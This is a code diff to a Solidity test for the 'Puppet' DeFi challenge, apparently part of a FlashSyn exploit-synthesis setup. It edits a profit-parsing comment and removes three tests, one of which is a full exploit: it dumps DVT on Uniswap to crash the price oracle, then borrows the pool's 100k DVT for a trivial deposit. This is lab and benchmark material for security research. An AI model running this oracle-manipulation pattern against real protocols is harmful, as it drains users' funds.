@@ -157,41 +157,11 @@ contract Puppet is DSTest, stdCheats {
         dvt.approve(address(uniswapExchange), 2 ** 256 - 1);
     }
 
-    // Profit is measured over DVT then ETH — the parser reads the two integers after
-    // "FlashSyn", and PuppetActions.calcProfit weighs them (ETH at 1000, DVT at 1).
+    // Profit is measured over DVT then ETH — the parser reads the two named values after
+    // "FlashSyn", and the manifest's calcProfit weighs them (ETH at 1000, DVT at 1).
     function profitSummary() public view returns (string memory) {
         return Strings.appendWithSpace(
             Strings.append("FlashSyn: DVT=", dvt.balanceOf(address(attacker))),
             Strings.append("ETH=", address(attacker).balance));
-    }
-
-    // Validation tests for `compile` / `deps` — the engine discards these when it
-    // generates collectors. testExample2 is the whole exploit (dump then borrow).
-    function testExample0() public {
-        emit log("=================== Separator ==================");
-        // Action: SwapUniswapDVT2ETH — dump all 1000 DVT, crashing the oracle.
-        uniswapExchange.tokenToEthSwapInput(1000 * 1e18, 1, 0xffffffff);
-        emit log("=================== Separator ==================");
-        revert("");
-    }
-
-    function testExample1() public {
-        emit log("=================== Separator ==================");
-        // Action: SwapUniswapETH2DVT — buy DVT back with 1 ETH.
-        uniswapExchange.ethToTokenSwapInput{value: 1 * 1e18}(1, 0xffffffff);
-        emit log("=================== Separator ==================");
-        revert("");
-    }
-
-    function testExample2() public {
-        // Manipulate first so the borrow is cheap.
-        uniswapExchange.tokenToEthSwapInput(1000 * 1e18, 1, 0xffffffff);
-        emit log("=================== Separator ==================");
-        // Action: PoolBorrow — drain the pool's 100k DVT for a tiny ETH deposit.
-        uint256 amt = 100000 * 1e18;
-        uint256 dep = puppetPool.calculateDepositRequired(amt);
-        puppetPool.borrow{value: dep}(amt);
-        emit log("=================== Separator ==================");
-        revert(profitSummary());
     }
 }
